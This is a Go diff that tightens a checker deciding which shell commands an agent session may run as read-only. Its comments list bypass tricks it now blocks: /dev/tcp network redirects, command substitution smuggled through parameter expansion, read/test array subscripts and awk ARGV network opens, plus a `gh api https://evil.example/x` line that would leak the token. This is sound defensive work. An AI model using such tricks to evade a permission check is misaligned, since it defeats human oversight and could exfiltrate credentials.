@@ -50,16 +50,40 @@ var (
 
 var readOnlyGit = map[string]bool{"status": true, "log": true, "diff": true, "show": true, "branch": true, "remote": true, "rev-parse": true, "ls-files": true, "blame": true, "describe": true}
 
-var journalWrites = []string{"--vacuum", "--rotate", "--flush", "--sync", "--relinquish", "--smart-relinquish", "--setup-keys", "--update-catalog"}
+var journalWrites = []string{"--vacuum", "--rotate", "--flush", "--sync", "--relinquish", "--smart-relinquish", "--setup-keys", "--update-catalog", "--cursor-file"}
 
 var (
 	shName         = regexp.MustCompile(`^[A-Za-z_][A-Za-z0-9_]*`)
 	assignName     = regexp.MustCompile(`^([A-Za-z_][A-Za-z0-9_]*)=`)
 	sedPrintRange  = regexp.MustCompile(`^(\d+|\$)?(,(\d+|\$))?p$`)
-	awkPrintRedir  = regexp.MustCompile(`printf?\b[^;{}]*>`)
-	awkSystem      = regexp.MustCompile(`\bsystem\s*\(`)
 	readOnlyBinDir = []string{"/usr/bin/", "/bin/", "/usr/local/bin/", "/usr/sbin/", "~/.local/bin/"}
+	braceParam     = regexp.MustCompile(`^(#?[A-Za-z_][A-Za-z0-9_]*|[A-Za-z_][A-Za-z0-9_]*(:?[-+?]|##?|%%?|//?|\^\^?|,,?)[A-Za-z0-9_./,%#+*?^~: -]*)$`)
+	fdNumber       = regexp.MustCompile(`^([0-9]+|-)$`)
 )
+
+// redirEnd: a redirect target ends at n (a blank, a separator or another
+// redirect), so nothing glued on (`>&1"/../x"`, `>/dev/null"x"`) changes it.
+func redirEnd(cmd string, n int) bool {
+	return n >= len(cmd) || strings.IndexByte(" \t\n;&|<>", cmd[n]) >= 0
+}
+
+// outTarget: the only files `>`, `>>`, `>|` and `&>` may write.
+func outTarget(t string) bool {
+	return t == "/dev/null" || t == "/dev/stdout" || t == "/dev/stderr"
+}
+
+// inTarget: a file `<` may read: no bash network pseudo-files
+// (/dev/tcp/HOST/PORT, /dev/udp/…), no other device or /proc file, no glob.
+func inTarget(t string) bool {
+	if t == "" || strings.ContainsAny(t, "*?[$") {
+		return false
+	}
+	c := path.Clean(t)
+	if c == "/dev/null" || c == "/dev/stdin" {
+		return true
+	}
+	return !strings.HasPrefix(c, "/dev/") && c != "/dev" && c != "/proc" && !strings.HasPrefix(c, "/proc/")
+}
 
 // shWord: one word of a parsed shell command. alts lists every value a word
 // can take when it uses a for-loop variable (`for p in a b; do x $p; done`);
@@ -155,6 +179,37 @@ func shSegments(cmd string) ([][]shWord, bool) {
 			cur[i] += s
 		}
 	}
+	bad := false
+	var closed []*shLoop // loops whose `done` this segment read
+	// keyword opens or closes if/while/until bodies as soon as it is read, so
+	// a while/until loop is open before its condition: a variable the
+	// condition uses can't be set later in the body
+	// (`X=-1; while git log $X; do X=--output=f; done`).
+	keyword := func(k string) {
+		switch k {
+		case "if":
+			compound++
+			ifs++
+		case "fi":
+			if ifs == 0 {
+				bad = true
+				return
+			}
+			ifs--
+			compound--
+		case "while", "until":
+			loops = append(loops, &shLoop{used: map[string]bool{}})
+			compound++
+		case "done":
+			if len(loops) == 0 {
+				bad = true
+				return
+			}
+			closed = append(closed, loops[len(loops)-1])
+			loops = loops[:len(loops)-1]
+			compound--
+		}
+	}
 	word := func() {
 		if in {
 			if braceExpansion.MatchString(raw.String()) {
@@ -164,13 +219,20 @@ func shSegments(cmd string) ([][]shWord, bool) {
 			if len(cur) > 1 {
 				w.alts = cur
 			}
-			seg = append(seg, w)
+			if len(seg) == 0 && w.plain && !w.unknown && shKeywords[w.text] {
+				keyword(w.text)
+			} else {
+				seg = append(seg, w)
+			}
 		}
 		cur = []string{""}
 		raw.Reset()
 		in, unknown, plain = false, false, true
 	}
 	fd := func() {
+		if in && strings.HasSuffix(raw.String(), "}") {
+			bad = true // {NAME}>f stores a descriptor number in NAME
+		}
 		if in && len(cur) == 1 && plain && strings.Trim(cur[0], "0123456789") == "" {
 			cur = []string{""}
 			raw.Reset()
@@ -193,34 +255,16 @@ func shSegments(cmd string) ([][]shWord, bool) {
 	}
 	end := func(sep string) bool {
 		word()
-		for len(seg) > 0 && seg[0].plain && shKeywords[seg[0].text] {
-			switch seg[0].text {
-			case "if":
-				compound++
-				ifs++
-			case "fi":
-				if ifs == 0 {
-					return false
-				}
-				ifs--
-				compound--
-			case "while", "until":
-				loops = append(loops, &shLoop{used: map[string]bool{}})
-				compound++
-			case "done":
-				if len(loops) == 0 {
-					return false
-				}
-				l := loops[len(loops)-1]
-				loops = loops[:len(loops)-1]
-				compound--
-				if l.forVar != "" && (l.cond || sep == "|" || sep == "&") {
-					v := vars[l.forVar]
-					vars[l.forVar] = unionWord(l.before, l.hadBefore, v)
-				}
-			}
-			seg = seg[1:]
+		if bad {
+			return false
 		}
+		for _, l := range closed {
+			if l.forVar != "" && (l.cond || sep == "|" || sep == "&") {
+				v := vars[l.forVar]
+				vars[l.forVar] = unionWord(l.before, l.hadBefore, v)
+			}
+		}
+		closed = nil
 		cond := compound > 0 || prevSep == "&&" || prevSep == "||" || prevSep == "|" || sep == "|" || sep == "&"
 		prevSep = sep
 		if len(seg) == 0 {
@@ -232,6 +276,9 @@ func shSegments(cmd string) ([][]shWord, bool) {
 				return false
 			}
 			name := seg[1].text
+			if !userVar(name) {
+				return false // for PATH in …, for IFS in …
+			}
 			v := shWord{}
 			var vals []string
 			for _, w := range seg[3:] {
@@ -285,14 +332,20 @@ func shSegments(cmd string) ([][]shWord, bool) {
 			}
 		case seg[ci].text == "read":
 			// read sets the variables it names (and REPLY) from its input.
-			for _, w := range append(seg[ci+1:], shWord{text: "REPLY"}) {
-				if w.unknown {
+			args := make([]string, 0, len(seg)-ci-1)
+			for _, w := range seg[ci+1:] {
+				if w.unknown || len(w.alts) > 1 {
 					return false
 				}
-				for _, a := range w.values() {
-					if shName.FindString(a) == a && !bind(a, shWord{text: a, unknown: true}, cond) {
-						return false
-					}
+				args = append(args, w.text)
+			}
+			names, ok := readNames(args)
+			if !ok {
+				return false
+			}
+			for _, a := range append(names, "REPLY") {
+				if !bind(a, shWord{text: a, unknown: true}, cond) {
+					return false
 				}
 			}
 		case seg[ci].text == "cd":
@@ -314,16 +367,25 @@ func shSegments(cmd string) ([][]shWord, bool) {
 		var name string
 		next := i
 		switch {
-		case strings.HasPrefix(rest, "("):
-			return i, false
+		case strings.HasPrefix(rest, "("), strings.HasPrefix(rest, "["):
+			return i, false // $(cmd), $((expr)), $[expr]
+		case !quoted && rest != "" && (rest[0] == '\'' || rest[0] == '"'):
+			return i, false // $'\x2d…' and $"…" quote words the parser would read literally
 		case strings.HasPrefix(rest, "{"):
 			j := strings.IndexByte(rest, '}')
 			if j < 0 {
 				return i, false
 			}
 			name, next = rest[1:j], i+1+j
-			if strings.ContainsRune(name, '=') {
-				return i, false // ${X:=v} sets X
+			// Only ${X}, ${#X} and ${X<op>literal}: no nested $ / ` / { / quotes
+			// (`${X:-$(cmd)}`), no ${X:=v} (sets X), no arithmetic
+			// (${X:n}, ${a[n]}) and no ${X@P} or ${!X}.
+			if !braceParam.MatchString(name) {
+				return i, false
+			}
+			base := shName.FindString(strings.TrimPrefix(name, "#"))
+			for _, l := range loops {
+				l.used[base] = true
 			}
 		case shName.MatchString(rest):
 			name = shName.FindString(rest)
@@ -460,7 +522,7 @@ func shSegments(cmd string) ([][]shWord, bool) {
 					i++
 				}
 				t, n := shTarget(cmd, i+1)
-				if t != "/dev/null" {
+				if !outTarget(t) || !redirEnd(cmd, n) {
 					return nil, false
 				}
 				i = n - 1
@@ -479,8 +541,9 @@ func shSegments(cmd string) ([][]shWord, bool) {
 			rest := cmd[i+1:]
 			switch {
 			case strings.HasPrefix(rest, "&"):
+				// >&N duplicates a descriptor; >&WORD writes the file WORD.
 				t, n := shTarget(cmd, i+2)
-				if t != "1" && t != "2" && t != "-" {
+				if !fdNumber.MatchString(t) || !redirEnd(cmd, n) {
 					return nil, false
 				}
 				i = n - 1
@@ -492,7 +555,7 @@ func shSegments(cmd string) ([][]shWord, bool) {
 					j++
 				}
 				t, n := shTarget(cmd, j)
-				if t != "/dev/null" {
+				if !outTarget(t) || !redirEnd(cmd, n) {
 					return nil, false
 				}
 				i = n - 1
@@ -503,7 +566,7 @@ func shSegments(cmd string) ([][]shWord, bool) {
 				return nil, false
 			}
 			t, n := shTarget(cmd, i+1)
-			if t == "" {
+			if !inTarget(t) || !redirEnd(cmd, n) {
 				return nil, false
 			}
 			i = n - 1
@@ -517,6 +580,86 @@ func shSegments(cmd string) ([][]shWord, bool) {
 		return nil, false
 	}
 	return segs, true
+}
+
+// readNames: the variables `read [options] NAME…` sets. Not ok for an
+// option it doesn't know, a non-numeric count or timeout, or a name that is
+// not a userVar: `read 'a[$(cmd)]'` runs cmd (array subscripts are
+// arithmetic), `read PATH` changes what the next command runs.
+func readNames(args []string) ([]string, bool) {
+	var names []string
+	i := 0
+	for ; i < len(args) && len(args[i]) > 1 && args[i][0] == '-'; i++ {
+		a := args[i]
+		if a == "--" {
+			i++
+			break
+		}
+		for j := 1; j < len(a); j++ {
+			c := a[j]
+			switch {
+			case strings.IndexByte("rse", c) >= 0:
+				continue
+			case strings.IndexByte("adinNptu", c) < 0:
+				return nil, false
+			}
+			v := a[j+1:]
+			if v == "" {
+				if i+1 >= len(args) {
+					return nil, false
+				}
+				i++
+				v = args[i]
+			}
+			switch {
+			case c == 'a':
+				names = append(names, v)
+			case strings.IndexByte("nNu", c) >= 0 && (v == "" || strings.Trim(v, "0123456789") != ""):
+				return nil, false
+			case c == 't' && (v == "" || strings.Trim(v, "0123456789.") != ""):
+				return nil, false
+			}
+			break
+		}
+	}
+	names = append(names, args[i:]...)
+	for _, n := range names {
+		if !userVar(n) {
+			return nil, false
+		}
+	}
+	return names, true
+}
+
+// testUnary / testBinary: test operators whose operands are only compared or
+// looked up as files. -v and -R are left out: they evaluate an array
+// subscript (`test -v 'a[$(cmd)]'` runs cmd).
+var (
+	testUnary  = map[string]bool{"-a": true, "-b": true, "-c": true, "-d": true, "-e": true, "-f": true, "-g": true, "-h": true, "-k": true, "-L": true, "-n": true, "-N": true, "-O": true, "-G": true, "-p": true, "-r": true, "-s": true, "-S": true, "-t": true, "-u": true, "-w": true, "-x": true, "-z": true}
+	testBinary = map[string]bool{"=": true, "==": true, "!=": true, "<": true, ">": true, "-eq": true, "-ne": true, "-lt": true, "-le": true, "-gt": true, "-ge": true, "-nt": true, "-ot": true, "-ef": true}
+)
+
+// readOnlyTest: test / [ with no -v, -R or subscript, and every word whose
+// value the parser doesn't know standing where it can only be an operand
+// (after a unary operator, beside a binary one, or alone).
+func readOnlyTest(args []shWord) bool {
+	if len(args) > 0 && args[len(args)-1].text == "]" && !args[len(args)-1].unknown {
+		args = args[:len(args)-1]
+	}
+	for i, w := range args {
+		if w.text == "-v" || w.text == "-R" || strings.Contains(w.text, "[") {
+			return false
+		}
+		if !w.unknown || len(args) == 1 {
+			continue
+		}
+		after := i > 0 && !args[i-1].unknown && (testUnary[args[i-1].text] || testBinary[args[i-1].text])
+		before := i+1 < len(args) && !args[i+1].unknown && testBinary[args[i+1].text]
+		if !after && !before {
+			return false
+		}
+	}
+	return true
 }
 
 func binName(w string) string {
@@ -535,17 +678,52 @@ func binName(w string) string {
 	return ""
 }
 
-func safeAssign(name string) bool {
-	switch name {
-	case "PATH", "IFS", "ENV", "BASH_ENV", "CDPATH", "PROMPT_COMMAND", "SHELLOPTS", "BASHOPTS", "PS4", "GLOBIGNORE", "HOME", "SHELL":
+var (
+	lowerVar = regexp.MustCompile(`^[a-z_][a-z0-9_]*$`)
+	upperVar = regexp.MustCompile(`^[A-Z][0-9]*$`)
+	// userUpperVars: upper-case names no program or shell reads.
+	userUpperVars = map[string]bool{
+		"REPLY": true, "DIR": true, "FILE": true, "FILES": true, "OUT": true, "NAME": true, "REPO": true, "BRANCH": true,
+		"TOPIC": true, "ID": true, "COUNT": true, "LINE": true, "MSG": true, "SRC": true, "DST": true, "KEY": true,
+		"VAL": true, "PATTERN": true, "PAT": true, "REV": true, "COMMIT": true, "SHA": true,
+	}
+	localeValue = regexp.MustCompile(`^(C|POSIX|[A-Za-z]{2,3}(_[A-Z]{2})?)(\.[A-Za-z0-9-]+)?$`)
+	tzValue     = regexp.MustCompile(`^:?[A-Za-z][A-Za-z0-9_+-]*(/[A-Za-z][A-Za-z0-9_+-]*)*$`)
+)
+
+// userVar: a variable name that only the command itself reads, so setting
+// it (NAME=v, for NAME in, read NAME) can't change what another program
+// does: lower-case names (not *proxy*), one capital letter (X, S2) and
+// userUpperVars. PATH, HOME, IFS, LD_*, GIT_*, XDG_*, GH_*, PAGER,
+// RIPGREP_CONFIG_PATH, GCONV_PATH, … are all refused (allow list, not a
+// deny list: adversarial review 2026-11-23).
+func userVar(name string) bool {
+	if lowerVar.MatchString(name) {
+		return !strings.Contains(name, "proxy")
+	}
+	return upperVar.MatchString(name) || userUpperVars[name]
+}
+
+// safeAssign: NAME=value in front of or before a command. Besides userVar
+// names, a few common environment settings with a harmless value.
+func safeAssign(name, value string, known bool) bool {
+	if userVar(name) {
+		return true
+	}
+	if !known {
 		return false
 	}
-	for _, p := range []string{"LD_", "GIT_", "BASH_FUNC", "LESS"} {
-		if strings.HasPrefix(name, p) {
-			return false
-		}
+	switch {
+	case name == "LC_ALL" || name == "LANG" || name == "LANGUAGE" || strings.HasPrefix(name, "LC_") && shName.MatchString(name):
+		return localeValue.MatchString(value)
+	case name == "TZ":
+		return tzValue.MatchString(value)
+	case name == "PAGER" || name == "GIT_PAGER" || name == "GH_PAGER" || name == "SYSTEMD_PAGER":
+		return value == "" || value == "cat"
+	case name == "NO_COLOR" || name == "COLUMNS":
+		return strings.Trim(value, "0123456789") == ""
 	}
-	return !strings.HasSuffix(name, "PAGER") && !strings.HasSuffix(name, "EDITOR")
+	return false
 }
 
 func readOnlySed(args []string) bool {
@@ -567,9 +745,52 @@ func readOnlySed(args []string) bool {
 	return quiet && script == 1
 }
 
+// longOpt: a matches one of the long options opts, also as the abbreviation
+// GNU getopt_long and git accept (`sort --out=f`, `journalctl --rot`), or as
+// a longer option starting with one (`--output-indicator-new`).
+func longOpt(a string, opts ...string) bool {
+	if !strings.HasPrefix(a, "--") {
+		return false
+	}
+	name, _, _ := strings.Cut(a, "=")
+	if len(name) < 3 {
+		return false
+	}
+	for _, o := range opts {
+		if strings.HasPrefix(o, name) || strings.HasPrefix(name, o) {
+			return true
+		}
+	}
+	return false
+}
+
+// shortFlag: a is a short-option word (-x, or combined -bCm) holding one of
+// letters.
+func shortFlag(a, letters string) bool {
+	return len(a) > 1 && a[0] == '-' && a[1] != '-' && strings.ContainsAny(a[1:], letters)
+}
+
+// readOnlyAwk: an awk program (or file operand / assignment) that can't
+// write, run or connect anywhere. Checked on the raw text, string literals
+// included, so a quote or brace inside a string can't hide anything
+// (`print "}" > "f"`): no pipes, no getline, no system(), no @ (indirect
+// calls, @load), no /inet and no ARGV/ARGC (gawk opens `ARGV[1]="/in" "et/…"`
+// as a network connection), and no `>` at all in a program that prints.
+func readOnlyAwk(a string) bool {
+	if strings.ContainsAny(a, "|@`") {
+		return false
+	}
+	for _, w := range []string{"system", "getline", "/inet", "inplace", "ARGV", "ARGC"} {
+		if strings.Contains(a, w) {
+			return false
+		}
+	}
+	return !(strings.Contains(a, ">") && strings.Contains(a, "print"))
+}
+
 func readOnlyGitArgs(sub string, args []string) bool {
 	for _, a := range args {
-		if strings.HasPrefix(a, "--output") || strings.HasPrefix(a, "--ext-diff") {
+		if longOpt(a, "--output", "--ext-diff") {
 			return false
 		}
 	}
@@ -698,7 +919,7 @@ func readOnlyWords(seg []shWord, extra [][]string) bool {
 			break
 		}
 		// `IFS= read -r line` only changes how read splits its input.
-		if !safeAssign(m[1]) && !(isRead && m[1] == "IFS") {
+		if !safeAssign(m[1], seg[0].text[len(m[0]):], !seg[0].unknown) && !(isRead && m[1] == "IFS") {
 			return false
 		}
 		seg = seg[1:]
@@ -719,17 +940,22 @@ func readOnlyWords(seg []shWord, extra [][]string) bool {
 	if privilegedWords(append([]string{seg[0].text}, f[1:]...)) {
 		return false
 	}
+	unknownArg := false
+	for _, w := range seg[1:] {
+		unknownArg = unknownArg || w.unknown
+	}
+	if name == "kmem" {
+		// kmem takes its options anywhere (`kmem rules --as x`), so word
+		// prefixes don't fit it: kmemAllowed matches extra lines itself.
+		return kmemAllowed(f[1:], unknownArg, extra)
+	}
 	for _, e := range extra {
 		if hasWordPrefix(f, e) {
 			return true
 		}
 	}
-	if argChecked[name] {
-		for _, w := range seg[1:] {
-			if w.unknown {
-				return false
-			}
-		}
+	if argChecked[name] && unknownArg {
+		return false
 	}
 	args := f[1:]
 	switch name {
@@ -741,8 +967,6 @@ func readOnlyWords(seg []shWord, extra [][]string) bool {
 				return false
 			}
 		}
-	case "kmem":
-		return readOnlyKmem(args)
 	case "git":
 		for len(args) > 0 && strings.HasPrefix(args[0], "-") {
 			switch {
@@ -755,24 +979,29 @@ func readOnlyWords(seg []shWord, extra [][]string) bool {
 			}
 		}
 		return len(args) > 0 && readOnlyGit[args[0]] && readOnlyGitArgs(args[0], args[1:])
-	case "sort", "tree":
+	case "sort":
 		for _, a := range args {
-			if strings.HasPrefix(a, "--output") || strings.HasPrefix(a, "--compress-program") {
+			if longOpt(a, "--output", "--compress-program") || shortFlag(a, "o") {
 				return false
 			}
-			if strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") && strings.ContainsRune(a, 'o') {
+		}
+	case "tree":
+		// -o FILE writes FILE; -R with -H writes 00Tree.html in every directory.
+		for _, a := range args {
+			if longOpt(a, "--output") || shortFlag(a, "oRH") {
 				return false
 			}
 		}
 	case "rg":
+		// --pre and --hostname-bin run a program; -z runs decompressors.
 		for _, a := range args {
-			if strings.HasPrefix(a, "--pre") || strings.HasPrefix(a, "--search-zip") || a == "-z" {
+			if longOpt(a, "--pre", "--pre-glob", "--search-zip", "--hostname-bin") || shortFlag(a, "z") {
 				return false
 			}
 		}
 	case "file":
 		for _, a := range args {
-			if a == "-C" || a == "--compile" {
+			if longOpt(a, "--compile") || shortFlag(a, "C") {
 				return false
 			}
 		}
@@ -793,21 +1022,25 @@ func readOnlyWords(seg []shWord, extra [][]string) bool {
 			case strings.HasPrefix(a, "-F") || strings.HasPrefix(a, "-v"):
 			case strings.HasPrefix(a, "-"):
 				return false
-			case awkSystem.MatchString(a) || strings.Contains(a, "|") || awkPrintRedir.MatchString(a) || strings.Contains(a, "@load") || strings.Contains(a, "@include") || strings.Contains(a, "inplace"):
+			case !readOnlyAwk(a):
 				return false
 			}
 		}
 	case "journalctl":
 		for _, a := range args {
-			for _, w := range journalWrites {
-				if strings.HasPrefix(a, w) {
-					return false
-				}
+			if longOpt(a, journalWrites...) {
+				return false
 			}
 		}
 	case "systemctl":
 		// Status and listing verbs only (systemctlReads), user or system
-		// units; privilegedWords already refused every other system verb.
+		// units, on this machine (-H/--host runs it over ssh, -M in a
+		// container); privilegedWords already refused every other system verb.
+		for _, a := range args {
+			if longOpt(a, "--host", "--machine") || shortFlag(a, "HM") {
+				return false
+			}
+		}
 		for _, a := range args {
 			if !strings.HasPrefix(a, "-") {
 				return systemctlReads[a]
@@ -816,10 +1049,15 @@ func readOnlyWords(seg []shWord, extra [][]string) bool {
 		return false
 	case "date":
 		for _, a := range args {
-			if strings.HasPrefix(a, "--set") || strings.HasPrefix(a, "-") && !strings.HasPrefix(a, "--") && strings.Contains(a, "s") {
+			if longOpt(a, "--set") || shortFlag(a, "s") {
 				return false
 			}
 		}
+	case "read":
+		_, ok := readNames(args)
+		return ok && !unknownArg
+	case "test", "[":
+		return readOnlyTest(seg[1:])
 	case "printf":
 		// printf -v NAME sets a variable the parser would not follow.
 		return len(seg) == 1 || !seg[1].unknown && !strings.HasPrefix(args[0], "-v")
@@ -902,42 +1140,130 @@ func (d *desk) readOnlyDialog() {
 // (user 2026-11-23: `kmem --as zomboid find …` needed a plan; brief and rules
 // only mark them read for that name, so under --as they count only for the
 // session's own name: desk.readOnlyExtraFor adds those two; user 2026-11-23).
+//
+// kmem takes options anywhere in the line (`kmem rules --as other`), so
+// --as is looked for in every word (kmemSplit).
 func readOnlyKmem(args []string) bool {
-	asName := false
-	if len(args) >= 2 && args[0] == "--as" {
-		args, asName = args[2:], true
-	} else if len(args) >= 1 && strings.HasPrefix(args[0], "--as=") {
-		args, asName = args[1:], true
-	}
-	if len(args) == 0 {
+	as, words, ok := kmemSplit(args)
+	if !ok || len(words) == 0 {
 		return false
 	}
-	var words []string
-	for _, a := range args {
-		if a != "--json" {
+	if as != "" && (words[0] == "brief" || words[0] == "rules") {
+		return false
+	}
+	return readOnlyKmemWords(words)
+}
+
+// kmemSplit takes `--as NAME` / `--as=NAME` out of a kmem command line,
+// wherever it stands. Not ok: --as twice or without a name, or a bare --
+// (after which kmem reads options as text).
+func kmemSplit(args []string) (as string, words []string, ok bool) {
+	seen := false
+	for i := 0; i < len(args); i++ {
+		a := args[i]
+		switch {
+		case a == "--":
+			return "", nil, false
+		case a == "--as" || strings.HasPrefix(a, "--as="):
+			if seen {
+				return "", nil, false
+			}
+			seen = true
+			if a == "--as" {
+				if i+1 >= len(args) {
+					return "", nil, false
+				}
+				i++
+				as = args[i]
+			} else {
+				as = a[len("--as="):]
+			}
+			if as == "" || strings.HasPrefix(as, "-") {
+				return "", nil, false
+			}
+		default:
 			words = append(words, a)
 		}
 	}
-	if len(words) == 0 {
+	return as, words, true
+}
+
+// kmemValueOpts: kmem read options that take a value.
+var kmemValueOpts = map[string]bool{"--cap": true, "--topic": true, "-n": true, "--token": true}
+
+// readOnlyKmemWords: a kmem command (without --as) that only reads. Any
+// option other than --json, --all and the value options in kmemValueOpts
+// makes it a write or unknown.
+func readOnlyKmemWords(words []string) bool {
+	if len(words) == 1 && (words[0] == "--version" || words[0] == "--help" || words[0] == "-h") {
+		return true
+	}
+	var ops []string
+	for i := 0; i < len(words); i++ {
+		w := words[i]
+		switch {
+		case w == "--json" || w == "--all":
+		case kmemValueOpts[w]:
+			if i+1 >= len(words) || strings.HasPrefix(words[i+1], "-") {
+				return false
+			}
+			i++
+		case strings.HasPrefix(w, "--cap=") || strings.HasPrefix(w, "--topic="):
+		case strings.HasPrefix(w, "-"):
+			return false
+		default:
+			ops = append(ops, w)
+		}
+	}
+	if len(ops) == 0 {
 		return false
 	}
-	switch words[0] {
-	case "brief", "rules":
-		return !asName
-	case "get", "find", "show", "context", "recall", "topics", "version", "help":
+	switch ops[0] {
+	case "brief", "fixed":
+		return len(ops) == 1
+	case "rules", "get", "find", "show", "context", "recall", "topics", "version", "help":
 		return true
-	case "--version", "--help", "-h":
-		return len(words) == 1
-	case "fixed":
-		return len(words) == 1
 	case "task":
-		return len(words) >= 2 && words[1] == "list"
+		return len(ops) >= 2 && (ops[1] == "list" || ops[1] == "check")
 	case "handoff":
-		return len(words) >= 2 && (words[1] == "get" || words[1] == "list" || words[1] == "resolve" || words[1] == "policy" && len(words) == 2)
+		return len(ops) >= 2 && (ops[1] == "get" || ops[1] == "list" || ops[1] == "resolve" || ops[1] == "policy" && len(ops) == 2)
 	case "trash":
-		return len(words) >= 2 && words[1] == "list"
+		return len(ops) == 2 && ops[1] == "list"
 	}
 	return false
+}
+
+// kmemAllowed: a kmem command runs without a plan. Extra lines starting with
+// kmem match on the command's --as name (wherever it stands) and words; a
+// line matches a longer command only when that command is a read
+// (`kmem handoff policy` doesn't let `kmem handoff policy set …` through).
+// A bare `kmem` line (Quill's handoff save) lets every kmem command through.
+func kmemAllowed(args []string, unknown bool, extra [][]string) bool {
+	for _, e := range extra {
+		if len(e) == 1 && e[0] == "kmem" {
+			return true
+		}
+	}
+	if unknown {
+		return false // {--as,x}, $V: the words kmem sees are not known
+	}
+	as, words, ok := kmemSplit(args)
+	if !ok || len(words) == 0 {
+		return false
+	}
+	for _, e := range extra {
+		if len(e) < 2 || e[0] != "kmem" {
+			continue
+		}
+		eas, ew, eok := kmemSplit(e[1:])
+		if !eok || eas != as || !hasWordPrefix(words, ew) {
+			continue
+		}
+		if len(words) == len(ew) || readOnlyKmemWords(words) {
+			return true
+		}
+	}
+	return readOnlyKmem(args)
 }
 
 // readOnlyCommandV: `command -v|-V NAME…` only looks names up; any other
@@ -1027,7 +1353,7 @@ func readOnlyGhAPI(args []string) bool {
 			if hasVal {
 				return false
 			}
-		case "-q", "--jq", "-t", "--template", "--cache", "--hostname", "-p", "--preview":
+		case "-q", "--jq", "-t", "--template", "--cache", "-p", "--preview":
 			if _, ok := value(); !ok {
 				return false
 			}
@@ -1057,23 +1383,20 @@ func readOnlyGhAPI(args []string) bool {
 	if len(endpoints) != 1 {
 		return false
 	}
-	if endpoints[0] != "graphql" {
+	// Only endpoints on the configured GitHub host: gh sends the token to
+	// an absolute URL too (`gh api https://evil.example/x`).
+	ep := strings.ToLower(endpoints[0])
+	if strings.Contains(ep, "://") || strings.HasPrefix(ep, "//") || strings.HasPrefix(ep, "http") || strings.ContainsAny(ep, "@\\") {
+		return false
+	}
+	if ep != "graphql" {
 		return len(fields) == 0 // fields make gh send a POST
 	}
-	// GraphQL: a query (never a mutation) given inline; other fields are
-	// its variables.
-	query := false
-	for _, f := range fields {
-		k, v, ok := strings.Cut(f, "=")
-		if !ok {
-			return false
-		}
-		if k == "query" {
-			if strings.HasPrefix(v, "@") || strings.Contains(strings.ToLower(v), "mutation") {
-				return false
-			}
-			query = true
-		}
+	// GraphQL: exactly one field, an inline query (never a mutation, no
+	// @file upload).
+	if len(fields) != 1 {
+		return false
 	}
-	return query
+	k, v, ok := strings.Cut(fields[0], "=")
+	return ok && k == "query" && !strings.Contains(v, "@") && !strings.Contains(strings.ToLower(v), "mutation")
 }
